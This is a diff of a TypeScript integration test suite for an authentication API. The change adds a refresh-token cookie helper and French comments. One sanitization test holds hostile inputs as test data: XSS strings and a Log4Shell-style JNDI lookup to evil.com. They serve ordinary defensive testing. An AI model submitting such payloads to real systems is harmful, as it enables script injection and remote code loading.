@@ -5,12 +5,22 @@ import bcrypt from 'bcryptjs';
 
 const prisma = new PrismaClient();
 
+// Fonction utilitaire pour extraire le refresh token des cookies
+const extractRefreshTokenCookie = (headers: any): string => {
+  const setCookieHeader = headers['set-cookie'];
+  const cookieArray = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
+  return cookieArray.find((cookie: string) => 
+    cookie && cookie.startsWith('refreshToken=')
+  ) || '';
+};
+
 describe('Auth Integration Tests', () => {
   let testUser: any;
   let accessToken: string;
   let refreshTokenCookie: string;
 
   beforeAll(async () => {
+    // Utiliser sessions au lieu de refreshToken
     await prisma.session.deleteMany({});
     await prisma.user.deleteMany({
       where: { email: { contains: 'test' } }
@@ -18,6 +28,7 @@ describe('Auth Integration Tests', () => {
   });
 
   afterAll(async () => {
+    // Utiliser sessions au lieu de refreshToken
     await prisma.session.deleteMany({});
     await prisma.user.deleteMany({
       where: { email: { contains: 'test' } }
@@ -42,14 +53,12 @@ describe('Auth Integration Tests', () => {
       expect(registerResponse.body.success).toBe(true);
       expect(registerResponse.body.data.user.email).toBe(registrationData.email);
       
-      const setCookieHeader = registerResponse.headers['set-cookie'];
-      refreshTokenCookie = setCookieHeader.find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
+      refreshTokenCookie = extractRefreshTokenCookie(registerResponse.headers);
       
       accessToken = registerResponse.body.data.tokens.accessToken;
       testUser = registerResponse.body.data.user;
 
+      // Vérifier qu'une session a été créée
       const sessions = await prisma.session.findMany({
         where: { userId: testUser.id }
       });
@@ -64,6 +73,7 @@ describe('Auth Integration Tests', () => {
 
       const updateData = {
         firstName: 'UpdatedName',
+        // Retirer phoneNumber car il n'existe pas dans votre schéma
       };
 
       const updateResponse = await request(app)
@@ -85,6 +95,7 @@ describe('Auth Integration Tests', () => {
       expect(changePasswordResponse.status).toBe(200);
       expect(changePasswordResponse.body.success).toBe(true);
 
+      // Vérifier que toutes les sessions ont été supprimées après changement de mot de passe
       const sessionsAfterPasswordChange = await prisma.session.findMany({
         where: { userId: testUser.id }
       });
@@ -101,10 +112,9 @@ describe('Auth Integration Tests', () => {
       expect(loginResponse.body.success).toBe(true);
 
       const newAccessToken = loginResponse.body.data.tokens.accessToken;
-      const newRefreshCookie = loginResponse.headers['set-cookie'].find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
+      const newRefreshCookie = extractRefreshTokenCookie(loginResponse.headers);
 
+      // Vérifier qu'une nouvelle session a été créée
       const newSessions = await prisma.session.findMany({
         where: { userId: testUser.id }
       });
@@ -117,6 +127,7 @@ describe('Auth Integration Tests', () => {
       expect(logoutResponse.status).toBe(200);
       expect(logoutResponse.body.success).toBe(true);
 
+      // Vérifier que la session a été supprimée après logout
       const sessionsAfterLogout = await prisma.session.findMany({
         where: { userId: testUser.id }
       });
@@ -139,12 +150,11 @@ describe('Auth Integration Tests', () => {
         .post('/api/v1/auth/register')
         .send(userData);
 
-      const initialRefreshCookie = registerResponse.headers['set-cookie'].find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
+      const initialRefreshCookie = extractRefreshTokenCookie(registerResponse.headers);
 
       const userId = registerResponse.body.data.user.id;
 
+      // Vérifier qu'une session initiale existe
       let sessions = await prisma.session.findMany({
         where: { userId }
       });
@@ -158,15 +168,14 @@ describe('Auth Integration Tests', () => {
       expect(refreshResponse.body.success).toBe(true);
       expect(refreshResponse.body.data.tokens.accessToken).toBeDefined();
 
+      // Vérifier qu'une nouvelle session a été créée et l'ancienne supprimée
       sessions = await prisma.session.findMany({
         where: { userId }
       });
       expect(sessions.length).toBe(1);
 
       const newAccessToken = refreshResponse.body.data.tokens.accessToken;
-      const newRefreshCookie = refreshResponse.headers['set-cookie'].find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
+      const newRefreshCookie = extractRefreshTokenCookie(refreshResponse.headers);
 
       const profileResponse = await request(app)
         .get('/api/v1/auth/profile')
@@ -175,6 +184,7 @@ describe('Auth Integration Tests', () => {
       expect(profileResponse.status).toBe(200);
       expect(profileResponse.body.data.user.email).toBe(userData.email);
 
+      // Tester l'ancien refresh token (doit échouer)
       const oldRefreshResponse = await request(app)
         .post('/api/v1/auth/refresh')
         .set('Cookie', initialRefreshCookie);
@@ -183,6 +193,7 @@ describe('Auth Integration Tests', () => {
     });
 
     it('should handle remember me functionality', async () => {
+      // Nettoyer d'abord
       await prisma.session.deleteMany({
         where: {
           user: { email: 'integration@test.com' }
@@ -201,19 +212,20 @@ describe('Auth Integration Tests', () => {
 
       expect(loginResponse.status).toBe(200);
       
-      const refreshCookie = loginResponse.headers['set-cookie'].find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
+      const refreshCookie = extractRefreshTokenCookie(loginResponse.headers);
       
+      // Vérifier que le cookie a une expiration longue (30 jours)
       expect(refreshCookie).toContain('Max-Age=2592000');
 
       const userId = loginResponse.body.data.user.id;
       
+      // Vérifier que la session a une expiration longue
       const longSession = await prisma.session.findFirst({
         where: { userId }
       });
       expect(longSession).toBeTruthy();
       
+      // Nettoyer la session longue
       await prisma.session.deleteMany({ where: { userId } });
 
       const shortLoginResponse = await request(app)
@@ -226,10 +238,9 @@ describe('Auth Integration Tests', () => {
 
       expect(shortLoginResponse.status).toBe(200);
       
-      const shortRefreshCookie = shortLoginResponse.headers['set-cookie'].find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
+      const shortRefreshCookie = extractRefreshTokenCookie(shortLoginResponse.headers);
       
+      // Vérifier que le cookie a une expiration courte (7 jours)
       expect(shortRefreshCookie).toContain('Max-Age=604800');
     });
 
@@ -239,6 +250,7 @@ describe('Auth Integration Tests', () => {
         password: 'NewPassword123!',
       };
 
+      // Nettoyer les sessions existantes
       const existingUser = await prisma.user.findUnique({
         where: { email: loginData.email }
       });
@@ -260,6 +272,7 @@ describe('Auth Integration Tests', () => {
       const device2Token = device2Response.body.data.tokens.accessToken;
       const userId = device1Response.body.data.user.id;
 
+      // Vérifier que 2 sessions existent
       let sessions = await prisma.session.findMany({
         where: { userId }
       });
@@ -282,17 +295,14 @@ describe('Auth Integration Tests', () => {
 
       expect(logoutAllResponse.status).toBe(200);
 
+      // Vérifier que toutes les sessions ont été supprimées
       sessions = await prisma.session.findMany({
         where: { userId }
       });
       expect(sessions.length).toBe(0);
 
-      const device1Cookie = device1Response.headers['set-cookie'].find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
-      const device2Cookie = device2Response.headers['set-cookie'].find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
+      const device1Cookie = extractRefreshTokenCookie(device1Response.headers);
+      const device2Cookie = extractRefreshTokenCookie(device2Response.headers);
 
       const refresh1Response = await request(app)
         .post('/api/v1/auth/refresh')
@@ -331,6 +341,7 @@ describe('Auth Integration Tests', () => {
         email: '<script>alert("xss")</script>@test.com',
         firstName: '<img src=x onerror=alert("xss")>',
         lastName: '${jndi:ldap://evil.com/a}',
+        // Retirer phoneNumber car il n'existe pas dans le schéma
       };
 
       const response = await request(app)
@@ -376,11 +387,12 @@ describe('Auth Integration Tests', () => {
 
       const userId = registerResponse.body.data.user.id;
 
+      // Créer une session expirée manuellement
       const expiredSession = await prisma.session.create({
         data: {
           token: 'expired-token',
           userId,
-          expiresAt: new Date(Date.now() - 1000)
+          expiresAt: new Date(Date.now() - 1000) // Expirée il y a 1 seconde
         }
       });
 
@@ -403,10 +415,9 @@ describe('Auth Integration Tests', () => {
         .send(userData);
 
       const userId = registerResponse.body.data.user.id;
-      const refreshCookie = registerResponse.headers['set-cookie'].find((cookie: string) => 
-        cookie.startsWith('refreshToken=')
-      );
+      const refreshCookie = extractRefreshTokenCookie(registerResponse.headers);
 
+      // Vérifier qu'une session existe
       let sessions = await prisma.session.findMany({
         where: { userId }
       });
@@ -418,6 +429,7 @@ describe('Auth Integration Tests', () => {
 
       expect(logoutResponse.status).toBe(200);
 
+      // Vérifier que la session a été supprimée
       sessions = await prisma.session.findMany({
         where: { userId }
       });
